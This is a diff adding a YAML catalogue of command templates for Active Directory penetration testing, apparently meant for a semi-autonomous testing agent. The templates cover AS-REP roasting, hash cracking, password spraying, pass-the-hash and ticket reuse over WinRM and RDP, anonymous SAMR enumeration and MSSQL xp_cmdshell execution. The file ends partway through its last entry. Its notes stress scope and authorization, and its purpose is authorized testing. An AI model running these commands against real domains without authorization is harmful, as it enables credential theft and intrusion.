@@ -1,0 +1,2342 @@
+- id: kerberos-user-enum-for-asrep
+  name: Kerberos candidate account enumeration for AS-REP roasting
+  phase: cred
+  tier: floor
+  autonomy: semi
+  when:
+  - service: kerberos
+  - port: 88
+  tool: kerbrute
+  invocation: kerbrute userenum --dc {{host}} -d {{domain}} {{wordlist}}
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms:
+  - account
+  verify:
+    success_if: exit_code == 0 && stdout contains '+ VALID USERNAME:'
+    emits:
+    - account
+  cost_hint: moderate
+  notes: Use an approved candidate list and account for Kerberos audit events.
+  _family: ad-asrep
+- id: ldap-asrep-anon-discovery
+  name: Anonymous LDAP discovery of preauthentication-disabled accounts
+  phase: cred
+  tier: floor
+  autonomy: semi
+  when:
+  - service: ldap
+  - port: 389
+  tool: ldapsearch
+  invocation: ldapsearch -LLL -x -H ldap://{{host}}:{{port}} -b "{{base_dn}}" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+    sAMAccountName userPrincipalName
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - account
+  - asreproastable
+  verify:
+    success_if: exit_code == 0 && stdout contains 'sAMAccountName:'
+    emits:
+    - account
+    - asreproastable
+  cost_hint: cheap
+  notes: Anonymous directory binds are commonly disabled and should be attempted only
+    within scope.
+  _family: ad-asrep
+- id: ldap-asrep-auth-discovery
+  name: Authenticated LDAP discovery of preauthentication-disabled accounts
+  phase: cred
+  tier: standard
+  autonomy: semi
+  when:
+  - service: ldap
+  - port: 389
+  tool: ldapsearch
+  invocation: ldapsearch -LLL -x -H ldap://{{host}}:{{port}} -D "{{user}}" -w "{{password}}"
+    -b "{{base_dn}}" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+    sAMAccountName userPrincipalName
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - account
+  - asreproastable
+  verify:
+    success_if: exit_code == 0 && stdout contains 'sAMAccountName:'
+    emits:
+    - account
+    - asreproastable
+  cost_hint: cheap
+  notes: Use a minimally privileged approved bind identity and avoid writing directory
+    attributes.
+  _family: ad-asrep
+- id: asrep-getnpusers-single
+  name: Targeted unauthenticated AS-REP request
+  phase: cred
+  tier: floor
+  autonomy: semi
+  when:
+  - service: kerberos
+  - port: 88
+  tool: impacket-GetNPUsers
+  invocation: impacket-GetNPUsers {{domain}}/{{user}} -dc-ip {{host}} -no-pass -request
+    -format hashcat
+  parallel_safe: true
+  blast_radius: low
+  operator: ad-asreproast
+  confirms:
+  - asreproastable
+  - crackable_hash
+  verify:
+    success_if: exit_code == 0 && stdout contains '$krb5asrep$'
+    emits:
+    - asreproastable
+    - crackable_hash
+  cost_hint: cheap
+  notes: Request only approved candidate accounts because Kerberos activity is logged.
+  _family: ad-asrep
+- id: asrep-getnpusers-usersfile
+  name: Batch unauthenticated AS-REP requests from candidate list
+  phase: cred
+  tier: standard
+  autonomy: semi
+  when:
+  - service: kerberos
+  - port: 88
+  tool: impacket-GetNPUsers
+  invocation: impacket-GetNPUsers {{domain}}/ -usersfile {{wordlist}} -dc-ip {{host}}
+    -no-pass -request -format hashcat
+  parallel_safe: true
+  blast_radius: low
+  operator: ad-asreproast
+  confirms:
+  - asreproastable
+  - crackable_hash
+  verify:
+    success_if: exit_code == 0 && stdout contains '$krb5asrep$'
+    emits:
+    - asreproastable
+    - crackable_hash
+  cost_hint: moderate
+  notes: Throttle large candidate lists to limit audit noise and unnecessary requests.
+  _family: ad-asrep
+- id: asrep-nxc-ldap
+  name: NetExec LDAP AS-REP roast collection
+  phase: cred
+  tier: standard
+  autonomy: semi
+  when:
+  - service: ldap
+  - port: 389
+  - service: kerberos
+  - port: 88
+  tool: nxc
+  invocation: nxc ldap {{host}} -d {{domain}} -u {{user}} -p {{password}} --asreproast
+    /dev/stdout
+  parallel_safe: true
+  blast_radius: low
+  operator: ad-asreproast
+  confirms:
+  - asreproastable
+  - crackable_hash
+  verify:
+    success_if: exit_code == 0 && stdout contains '$krb5asrep$'
+    emits:
+    - asreproastable
+    - crackable_hash
+  cost_hint: moderate
+  notes: Use an approved low-privilege domain account and protect captured output.
+  _family: ad-asrep
+- id: asrep-rubeus-domain
+  name: Windows-native Rubeus AS-REP roast collection
+  phase: cred
+  tier: standard
+  autonomy: semi
+  when:
+  - service: kerberos
+  - port: 88
+  tool: Rubeus.exe
+  invocation: Rubeus.exe asreproast /domain:{{domain}} /dc:{{host}} /format:hashcat
+    /nowrap
+  parallel_safe: true
+  blast_radius: low
+  operator: ad-asreproast
+  confirms:
+  - asreproastable
+  - crackable_hash
+  verify:
+    success_if: exit_code == 0 && stdout contains '$krb5asrep$'
+    emits:
+    - asreproastable
+    - crackable_hash
+  cost_hint: moderate
+  notes: Run only from an authorized Windows context and retain output as sensitive
+    evidence.
+  _family: ad-asrep
+- id: asrep-hashcat-crack
+  name: Offline cracking of captured AS-REP hashes
+  phase: cred
+  tier: heavy
+  autonomy: manual
+  when:
+  - service: kerberos
+  - port: 88
+  tool: hashcat
+  invocation: hashcat -m 18200 {{hashfile}} {{wordlist}} --status --status-timer 10
+  parallel_safe: false
+  blast_radius: none
+  operator: ad-crack-hash
+  confirms:
+  - crackable_hash
+  verify:
+    success_if: 'exit_code == 0 && stdout contains ''Status...........: Cracked'''
+    emits:
+    - has_hash
+  cost_hint: slow
+  notes: Offline only; protect captured hashes and recovered secrets under engagement
+    handling rules.
+  _family: ad-asrep
+- id: winrm-nxc-password-cmd
+  name: WinRM password authentication with benign command execution
+  phase: lateral
+  tier: floor
+  autonomy: semi
+  when:
+  - service: winrm
+  - port: 5985
+  tool: nxc
+  invocation: nxc winrm {{host}} --port {{port}} -u {{user}} -p '{{password}}' -x
+    "echo {{marker}}"
+  parallel_safe: true
+  blast_radius: low
+  operator: cred-reuse-login
+  confirms:
+  - have_cred
+  - cred_grants
+  - cred_reused_on
+  - rce_as
+  verify:
+    success_if: exit_code == 0 && stdout contains '{{marker}}'
+    emits:
+    - have_cred
+    - cred_grants
+    - cred_reused_on
+    - rce_as
+  cost_hint: cheap
+  notes: Use one benign marker command and stop after the first confirmed execution.
+  _family: ad-winrm-exec
+- id: winrm-nxc-https-powershell
+  name: WinRM HTTPS domain credential PowerShell execution
+  phase: lateral
+  tier: standard
+  autonomy: semi
+  when:
+  - service: winrm
+  - port: 5986
+  tool: nxc
+  invocation: nxc winrm {{host}} --port {{port}} --ssl -d {{domain}} -u {{user}} -p
+    '{{password}}' -X "Write-Output {{marker}}"
+  parallel_safe: true
+  blast_radius: low
+  operator: cred-reuse-login
+  confirms:
+  - have_cred
+  - cred_grants
+  - cred_reused_on
+  - rce_as
+  verify:
+    success_if: exit_code == 0 && stdout contains '{{marker}}'
+    emits:
+    - have_cred
+    - cred_grants
+    - cred_reused_on
+    - rce_as
+  cost_hint: cheap
+  notes: Use TLS when the discovered listener is HTTPS and keep the proof command
+    harmless.
+  _family: ad-winrm-exec
+- id: winrm-nxc-password-spray-exec
+  name: WinRM bounded password spray with execution proof
+  phase: cred
+  tier: heavy
+  autonomy: manual
+  when:
+  - service: winrm
+  - port: 5985
+  tool: nxc
+  invocation: nxc winrm {{host}} --port {{port}} -u {{userlist}} -p '{{password}}'
+    --continue-on-success -x "echo {{marker}}"
+  parallel_safe: false
+  blast_radius: high
+  operator: cred-reuse-login
+  confirms:
+  - have_cred
+  - cred_grants
+  - cred_reused_on
+  - rce_as
+  verify:
+    success_if: exit_code == 0 && stdout contains '{{marker}}'
+    emits:
+    - have_cred
+    - cred_grants
+    - cred_reused_on
+    - rce_as
+  cost_hint: slow
+  notes: Throttle to the documented lockout policy and use only an authorized candidate
+    set.
+  _family: ad-winrm-exec
+- id: winrm-nxc-local-auth-cmd
+  name: WinRM local-account command execution
+  phase: lateral
+  tier: standard
+  autonomy: semi
+  when:
+  - service: winrm
+  - port: 5985
+  tool: nxc
+  invocation: nxc winrm {{host}} --port {{port}} --local-auth -u {{user}} -p '{{password}}'
+    -x "echo {{marker}}"
+  parallel_safe: true
+  blast_radius: low
+  operator: cred-reuse-login
+  confirms:
+  - have_cred
+  - cred_grants
+  - cred_reused_on
+  - rce_as
+  verify:
+    success_if: exit_code == 0 && stdout contains '{{marker}}'
+    emits:
+    - have_cred
+    - cred_grants
+    - cred_reused_on
+    - rce_as
+  cost_hint: cheap
+  notes: Use local authentication only when the supplied account is target-local.
+  _family: ad-winrm-exec
+- id: winrm-nxc-pass-the-hash-cmd
+  name: WinRM pass-the-hash command execution
+  phase: lateral
+  tier: standard
+  autonomy: semi
+  when:
+  - service: winrm
+  - port: 5985
+  tool: nxc
+  invocation: nxc winrm {{host}} --port {{port}} -u {{user}} -H {{ntlm_hash}} -x "echo
+    {{marker}}"
+  parallel_safe: true
+  blast_radius: low
+  operator: ad-pth
+  confirms:
+  - has_hash
+  - controls_principal
+  - rce_as
+  verify:
+    success_if: exit_code == 0 && stdout contains '{{marker}}'
+    emits:
+    - has_hash
+    - controls_principal
+    - rce_as
+  cost_hint: cheap
+  notes: Use a harmless marker command because successful NTLM authentication creates
+    audit events.
+  _family: ad-winrm-exec
+- id: winrm-nxc-kerberos-ticket-cmd
+  name: WinRM Kerberos ticket command execution
+  phase: lateral
+  tier: standard
+  autonomy: semi
+  when:
+  - service: winrm
+  - port: 5985
+  tool: nxc
+  invocation: KRB5CCNAME={{ccache}} nxc winrm {{host}} --port {{port}} -d {{domain}}
+    -u {{user}} -k --use-kcache -X "Write-Output {{marker}}"
+  parallel_safe: true
+  blast_radius: low
+  operator: ad-ptt
+  confirms:
+  - has_ticket
+  - controls_principal
+  - rce_as
+  verify:
+    success_if: exit_code == 0 && stdout contains '{{marker}}'
+    emits:
+    - has_ticket
+    - controls_principal
+    - rce_as
+  cost_hint: cheap
+  notes: Use a current ticket cache and a hostname suitable for the WinRM service
+    principal.
+  _family: ad-winrm-exec
+- id: winrm-evil-winrm-marker
+  name: Evil-WinRM authenticated marker execution
+  phase: lateral
+  tier: standard
+  autonomy: semi
+  when:
+  - service: winrm
+  - port: 5985
+  tool: evil-winrm
+  invocation: printf 'Write-Output {{marker}}\r\nexit\r\n' | evil-winrm -i {{host}}
+    -P {{port}} -u {{user}} -p '{{password}}'
+  parallel_safe: false
+  blast_radius: low
+  operator: cred-reuse-login
+  confirms:
+  - have_cred
+  - cred_grants
+  - cred_reused_on
+  - rce_as
+  verify:
+    success_if: exit_code == 0 && stdout contains '{{marker}}'
+    emits:
+    - have_cred
+    - cred_grants
+    - cred_reused_on
+    - rce_as
+  cost_hint: cheap
+  notes: Exit immediately after the marker to minimize interactive-session footprint.
+  _family: ad-winrm-exec
+- id: winrm-build-cve-lead
+  name: WinRM NTLM build fingerprint for advisory lead
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: winrm
+  tool: nmap
+  invocation: nmap -Pn -sV --script http-ntlm-info -p {{port}} {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout contains 'Product_Version:'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: This is a version-to-advisory lead only; validate any vulnerability before
+    use.
+  _family: ad-winrm-exec
+- id: msrpc-endpoint-map
+  name: MS-RPC endpoint mapper interface dump
+  phase: recon
+  tier: floor
+  autonomy: full
+  when:
+  - service: msrpc
+  - port: 135
+  tool: impacket-rpcdump
+  invocation: impacket-rpcdump -port {{port}} {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit==0 and stdout contains an RPC interface UUID and a protocol binding
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: read-only mapping; retain exposed UUIDs and bindings for later validation
+  _family: ad-rpc-enum
+- id: rpcclient-null-session-probe
+  name: SMB RPC null-session server information probe
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: smb
+  - port: 445
+  tool: rpcclient
+  invocation: rpcclient -N -U '' {{host}} -c 'srvinfo'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit==0 and stdout contains server type information
+    emits:
+    - session
+  cost_hint: cheap
+  notes: make one null-session attempt only; failed access is commonly audited
+  _family: ad-rpc-enum
+- id: rpcclient-null-samr-user-enum
+  name: Anonymous SAMR domain user enumeration
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: smb
+  - port: 445
+  tool: rpcclient
+  invocation: rpcclient -N -U '' {{host}} -c 'enumdomusers'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - session
+  verify:
+    success_if: exit==0 and stdout contains at least one user record with a RID
+    emits:
+    - account
+  cost_hint: cheap
+  notes: stop on access denial rather than retrying anonymous enumeration
+  _family: ad-rpc-enum
+- id: samrdump-anonymous
+  name: Anonymous Impacket SAMR account dump
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: smb
+  - port: 445
+  tool: impacket-samrdump
+  invocation: impacket-samrdump -port {{port}} 'anonymous:anonymous@{{host}}'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit==0 and stdout contains at least one SAMR user, alias, or group
+      record
+    emits:
+    - account
+  cost_hint: cheap
+  notes: anonymous account metadata is sensitive; collect only what is needed
+  _family: ad-rpc-enum
+- id: samrdump-authenticated
+  name: Authenticated Impacket SAMR account dump
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: smb
+  - port: 445
+  tool: impacket-samrdump
+  invocation: impacket-samrdump -port {{port}} '{{domain}}/{{user}}:{{password}}@{{host}}'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - have_cred
+  verify:
+    success_if: exit==0 and stdout contains at least one account record and stderr
+      lacks an authentication failure
+    emits:
+    - session
+    - account
+  cost_hint: cheap
+  notes: use only scoped credentials and avoid saving account dumps to shared locations
+  _family: ad-rpc-enum
+- id: rpcclient-auth-samr-domain-enum
+  name: Authenticated RPC SAMR user and group enumeration
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: smb
+  - port: 445
+  tool: rpcclient
+  invocation: rpcclient -U '{{domain}}/{{user}}%{{password}}' {{host}} -c 'enumdomusers;
+    enumdomgroups'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - have_cred
+  verify:
+    success_if: exit==0 and stdout contains at least one user or group record with
+      a RID
+    emits:
+    - account
+  cost_hint: cheap
+  notes: enumerate only the identities and groups relevant to the assessed scope
+  _family: ad-rpc-enum
+- id: samr-rid-cycling
+  name: Authenticated SAMR RID cycling
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: smb
+  - port: 445
+  tool: netexec
+  invocation: netexec smb {{host}} -u '{{user}}' -p '{{password}}' --rid-brute {{rid_max}}
+  parallel_safe: false
+  blast_radius: low
+  operator: ''
+  confirms:
+  - have_cred
+  verify:
+    success_if: exit==0 and stdout reports at least one resolved RID-to-account mapping
+    emits:
+    - account
+  cost_hint: moderate
+  notes: cap and rate-limit RID requests to avoid unnecessary domain-controller load
+  _family: ad-rpc-enum
+- id: msrpc-version-cve-lead
+  name: MS-RPC interface version to public-exploit lead
+  phase: exploit
+  tier: standard
+  autonomy: manual
+  when:
+  - service: msrpc
+  - port: 135
+  tool: searchsploit
+  invocation: searchsploit --json '{{product}} {{version}}'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit==0 and stdout matches at least one relevant public exploit or
+      advisory record
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: 'lead only: validate product, version, exposure, and advisory applicability
+    before asserting vuln_present'
+  _family: ad-rpc-enum
+- id: smb-null-share-list
+  name: Anonymous SMB share listing
+  phase: enum
+  tier: floor
+  autonomy: full
+  when:
+  - service: smb
+  - port: 445
+  tool: smbclient
+  invocation: smbclient -N -p {{port}} -U '' -L //{{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - session
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)sharename'
+    emits:
+    - session
+  cost_hint: cheap
+  notes: Read-only null-session check; enumerate share contents separately.
+  _family: ad-smb-null
+- id: smb-guest-share-list
+  name: Guest SMB share listing
+  phase: enum
+  tier: floor
+  autonomy: full
+  when:
+  - service: smb
+  - port: 445
+  tool: smbclient
+  invocation: smbclient -N -p {{port}} -U 'guest' -L //{{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - session
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)sharename'
+    emits:
+    - session
+  cost_hint: cheap
+  notes: Treat guest access as distinct from anonymous access in evidence.
+  _family: ad-smb-null
+- id: nxc-smb-null-rid-cycle
+  name: Null-session SMB RID cycling
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: smb
+  - port: 445
+  tool: nxc
+  invocation: nxc smb {{host}} --port {{port}} -u '' -p '' --rid-brute {{rid_max}}
+  parallel_safe: false
+  blast_radius: low
+  operator: ''
+  confirms:
+  - session
+  - account
+  - principal
+  verify:
+    success_if: exit_code == 0 && stdout matches 'SidTypeUser'
+    emits:
+    - session
+    - account
+    - principal
+  cost_hint: moderate
+  notes: Bound {{rid_max}} to an approved range to limit noisy RPC requests.
+  _family: ad-smb-null
+- id: nxc-smb-null-password-policy
+  name: Null-session SMB password-policy query
+  phase: enum
+  tier: floor
+  autonomy: full
+  when:
+  - service: smb
+  - port: 445
+  tool: nxc
+  invocation: nxc smb {{host}} --port {{port}} -u '' -p '' --pass-pol
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - session
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)(minimum password length|password
+      complexity|lockout threshold)'
+    emits:
+    - session
+  cost_hint: cheap
+  notes: Record policy values without attempting password guessing.
+  _family: ad-smb-null
+- id: rpcclient-null-domain-users
+  name: Null-session RPC domain-user enumeration
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: smb
+  - port: 445
+  tool: rpcclient
+  invocation: rpcclient -N -p {{port}} -U '' {{host}} -c 'enumdomusers'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - session
+  - account
+  - principal
+  verify:
+    success_if: exit_code == 0 && stdout matches 'user:\[[^\]]+\] rid:\[0x[0-9A-Fa-f]+\]'
+    emits:
+    - session
+    - account
+    - principal
+  cost_hint: cheap
+  notes: Use only read-only RPC enumeration commands.
+  _family: ad-smb-null
+- id: rpcclient-null-password-policy
+  name: Null-session RPC password-policy query
+  phase: enum
+  tier: floor
+  autonomy: full
+  when:
+  - service: smb
+  - port: 445
+  tool: rpcclient
+  invocation: rpcclient -N -p {{port}} -U '' {{host}} -c 'getdompwinfo'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - session
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)(min_password_length|password_properties)'
+    emits:
+    - session
+  cost_hint: cheap
+  notes: This is a read-only SAMR query; do not turn policy data into guessing attempts.
+  _family: ad-smb-null
+- id: enum4linux-ng-null-sweep
+  name: Anonymous SMB enumeration sweep
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: smb
+  - port: 445
+  tool: enum4linux-ng
+  invocation: enum4linux-ng -A -u '' -p '' {{host}}
+  parallel_safe: false
+  blast_radius: low
+  operator: ''
+  confirms:
+  - session
+  - account
+  - principal
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)(share enumeration|users via
+      RID cycling|password policy)'
+    emits:
+    - session
+    - account
+    - principal
+  cost_hint: moderate
+  notes: Use when a broad read-only sweep is approved; it can generate many RPC requests.
+  _family: ad-smb-null
+- id: smb-version-cve-lead
+  name: SMB version to public-CVE lead
+  phase: recon
+  tier: standard
+  autonomy: manual
+  when:
+  - service: smb
+  - port: 445
+  tool: searchsploit
+  invocation: searchsploit --json "{{product}} {{version}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '"RESULTS_EXPLOIT":\s*\[\s*\{'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: Lead only; validate version applicability and exploit conditions before any
+    execution.
+  _family: ad-smb-null
+- id: rdp-ntlm-info
+  name: RDP NTLM host and domain metadata
+  phase: recon
+  tier: floor
+  autonomy: full
+  when:
+  - service: rdp
+  - port: 3389
+  tool: nmap
+  invocation: nmap -Pn -p {{port}} --script rdp-ntlm-info {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'NetBIOS_Computer_Name'
+    emits: []
+  cost_hint: cheap
+  notes: unauthenticated metadata collection; retain only the identity fields needed
+    for scoping
+  _family: ad-rdp
+- id: rdp-nla-security-enum
+  name: RDP NLA and security-layer enumeration
+  phase: enum
+  tier: floor
+  autonomy: full
+  when:
+  - service: rdp
+  - port: 3389
+  tool: nmap
+  invocation: nmap -Pn -p {{port}} --script rdp-enum-encryption {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'Security layer'
+    emits: []
+  cost_hint: cheap
+  notes: use the result to select an authentication path; do not infer credential
+    validity from it
+  _family: ad-rdp
+- id: rdp-version-cve-lead
+  name: RDP version-to-public-exploit lead lookup
+  phase: recon
+  tier: standard
+  autonomy: manual
+  when:
+  - service: rdp
+  - port: 3389
+  tool: searchsploit
+  invocation: searchsploit --json "{{product}} {{version}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - known_exploit
+  verify:
+    success_if: exit_code == 0 && stdout contains 'EDB-ID'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: lead only; manually validate version, prerequisites, and exploit safety before
+    execution
+  _family: ad-rdp
+- id: rdp-xfreerdp-domain-auth-only
+  name: RDP NLA domain credential validation
+  phase: cred
+  tier: standard
+  autonomy: semi
+  when:
+  - service: rdp
+  - port: 3389
+  tool: xfreerdp
+  invocation: xfreerdp /auth-only /v:{{host}}:{{port}} /u:{{user}} /p:{{password}}
+    /d:{{domain}} /cert:ignore
+  parallel_safe: false
+  blast_radius: low
+  operator: cred-to-session
+  confirms:
+  - cred_grants
+  verify:
+    success_if: exit_code == 0
+    emits:
+    - cred_grants
+  cost_hint: cheap
+  notes: make one approved NLA check and stop on failure to avoid lockout pressure
+  _family: ad-rdp
+- id: rdp-xfreerdp-pth-auth-only
+  name: RDP NLA pass-the-hash validation
+  phase: lateral
+  tier: standard
+  autonomy: semi
+  when:
+  - service: rdp
+  - port: 3389
+  tool: xfreerdp
+  invocation: xfreerdp /auth-only /v:{{host}}:{{port}} /u:{{user}} /pth:{{hash}} /d:{{domain}}
+    /cert:ignore
+  parallel_safe: false
+  blast_radius: low
+  operator: ad-pth
+  confirms:
+  - controls_principal
+  verify:
+    success_if: exit_code == 0
+    emits:
+    - controls_principal
+  cost_hint: cheap
+  notes: validate only an authorized hash and avoid opening an interactive desktop
+    session
+  _family: ad-rdp
+- id: rdp-nxc-domain-credential-check
+  name: RDP domain credential validation with NetExec
+  phase: cred
+  tier: standard
+  autonomy: semi
+  when:
+  - service: rdp
+  - port: 3389
+  tool: nxc
+  invocation: nxc rdp {{host}} --port {{port}} -u {{user}} -p {{password}} -d {{domain}}
+  parallel_safe: false
+  blast_radius: low
+  operator: cred-to-session
+  confirms:
+  - cred_grants
+  verify:
+    success_if: exit_code == 0 && stdout contains '[+]'
+    emits:
+    - cred_grants
+  cost_hint: cheap
+  notes: use a single approved credential pair and preserve the successful domain
+    context
+  _family: ad-rdp
+- id: rdp-nxc-local-credential-check
+  name: RDP local-account credential validation with NetExec
+  phase: cred
+  tier: standard
+  autonomy: semi
+  when:
+  - service: rdp
+  - port: 3389
+  tool: nxc
+  invocation: nxc rdp {{host}} --port {{port}} -u {{user}} -p {{password}} --local-auth
+  parallel_safe: false
+  blast_radius: low
+  operator: cred-to-session
+  confirms:
+  - cred_grants
+  verify:
+    success_if: exit_code == 0 && stdout contains '[+]'
+    emits:
+    - cred_grants
+  cost_hint: cheap
+  notes: use local-auth only when the account scope is known; do not retry failed
+    logons
+  _family: ad-rdp
+- id: rdp-nxc-domain-password-spray
+  name: RDP NLA single-password account validation
+  phase: cred
+  tier: heavy
+  autonomy: manual
+  when:
+  - service: rdp
+  - port: 3389
+  tool: nxc
+  invocation: nxc rdp {{host}} --port {{port}} -u {{wordlist}} -p {{password}} -d
+    {{domain}} --continue-on-success
+  parallel_safe: false
+  blast_radius: high
+  operator: cred-to-session
+  confirms:
+  - have_cred
+  - cred_grants
+  verify:
+    success_if: exit_code == 0 && stdout contains '[+]'
+    emits:
+    - have_cred
+    - cred_grants
+  cost_hint: slow
+  notes: run only with explicit authorization, a verified lockout policy, and an approved
+    attempt budget
+  _family: ad-rdp
+- id: mssql-instance-info-tcp
+  name: MSSQL TCP instance and version enumeration
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: nmap
+  invocation: nmap -Pn -p {{port}} --script ms-sql-info {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit==0 and stdout contains an MSSQL instance record
+    emits: []
+  cost_hint: cheap
+  notes: use the discovered listener port for read-only fingerprinting
+  _family: mssql-enum
+- id: mssql-browser-instance-info
+  name: MSSQL SQL Browser named-instance enumeration
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: mssql
+  - port: 1434
+  tool: nmap
+  invocation: nmap -Pn -sU -p {{port}} --script ms-sql-info {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit==0 and stdout contains a SQL Browser or MSSQL instance response
+    emits: []
+  cost_hint: moderate
+  notes: query SQL Browser before guessing ports for named instances
+  _family: mssql-enum
+- id: mssql-ntlm-info
+  name: MSSQL NTLM target-information enumeration
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: nmap
+  invocation: nmap -Pn -p {{port}} --script ms-sql-ntlm-info {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit==0 and stdout contains an NTLM target-information block
+    emits: []
+  cost_hint: cheap
+  notes: NTLM metadata can reveal naming context without attempting authentication
+  _family: mssql-enum
+- id: mssql-credential-validation
+  name: MSSQL supplied-credential validation
+  phase: cred
+  tier: standard
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: nxc
+  invocation: nxc mssql {{host}} --port {{port}} -u '{{user}}' -p '{{password}}'
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms:
+  - mssql_login
+  verify:
+    success_if: stdout contains an authenticated MSSQL login indicator
+    emits:
+    - mssql_login
+  cost_hint: cheap
+  notes: validate one supplied credential before attempting candidate lists
+  _family: mssql-enum
+- id: mssql-password-list-sweep
+  name: MSSQL password-list authentication sweep
+  phase: cred
+  tier: heavy
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: nxc
+  invocation: nxc mssql {{host}} --port {{port}} -u '{{user}}' -p {{wordlist}} --continue-on-success
+  parallel_safe: false
+  blast_radius: high
+  operator: ''
+  confirms:
+  - mssql_login
+  verify:
+    success_if: stdout contains an authenticated MSSQL login indicator
+    emits:
+    - mssql_login
+  cost_hint: slow
+  notes: rate-limit for lockout policy and stop after the first valid credential
+  _family: mssql-enum
+- id: mssql-sysadmin-role-check
+  name: MSSQL sysadmin role enumeration
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: nxc
+  invocation: nxc mssql {{host}} --port {{port}} -u '{{user}}' -p '{{password}}' -M
+    mssql_priv
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms:
+  - mssql_login
+  - mssql_sysadmin
+  verify:
+    success_if: stdout contains an authenticated login indicator and reports the sysadmin
+      role
+    emits:
+    - mssql_login
+    - mssql_sysadmin
+  cost_hint: cheap
+  notes: limit authenticated metadata checks to the approved account
+  _family: mssql-enum
+- id: mssql-xpcmdshell-command-exec
+  name: MSSQL xp_cmdshell command-execution validation
+  phase: exploit
+  tier: heavy
+  autonomy: manual
+  when:
+  - service: mssql
+  tool: nxc
+  invocation: nxc mssql {{host}} --port {{port}} -u '{{user}}' -p '{{password}}' -x
+    '{{command}}'
+  parallel_safe: false
+  blast_radius: high
+  operator: mssql-xp-cmdshell
+  confirms:
+  - rce_as
+  verify:
+    success_if: stdout contains the requested command output
+    emits:
+    - rce_as
+  cost_hint: moderate
+  notes: use only an approved non-destructive command template because execution is
+    auditable
+  _family: mssql-enum
+- id: mssql-version-exploit-lead
+  name: MSSQL version-to-public-exploit lead
+  phase: exploit
+  tier: standard
+  autonomy: manual
+  when:
+  - service: mssql
+  tool: searchsploit
+  invocation: searchsploit --json "Microsoft SQL Server {{version}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - known_exploit
+  verify:
+    success_if: exit==0 and stdout contains a public exploit record matched to {{version}}
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: this is a version lead only; validate applicability before execution
+  _family: mssql-enum
+- id: mssql-nmap-service-version
+  name: MSSQL service and build fingerprint
+  phase: recon
+  tier: standard
+  autonomy: semi
+  when:
+  - port: 1433
+  tool: nmap
+  invocation: nmap -Pn -sV --version-all -p {{port}} {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
